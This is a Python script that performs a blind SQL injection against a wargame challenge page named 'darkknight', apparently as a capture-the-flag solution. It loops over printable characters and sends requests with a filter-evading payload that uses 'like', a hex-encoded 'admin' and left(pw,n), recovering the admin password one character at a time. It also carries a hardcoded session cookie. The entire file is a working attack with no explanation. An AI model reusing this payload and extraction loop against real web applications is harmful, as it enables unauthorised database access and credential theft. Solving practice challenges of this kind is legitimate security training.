import requests
import string
url = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'
char = string.printable
cookie = {'Cookie':'PHPSESSID=pcpo1krk9mlbtdeumtotij2ako'}
password =''
session = requests.session()
for i in range(1,20):
    for j in char:
        pass_1 = password + j
        print(pass_1)
        param = 'pw= 1&no= 1 || 1 like 1 %26%26 id like 0x61646d696e %26%26 left(pw,{}) like "{}"-- -'.format(i,pass_1)
        r = session.get(url , params = param , headers = cookie)
        if ('Hello admin' in r.text):
            print(len(r.text) , param , r.url)
            password = password + j
            print(password)
            break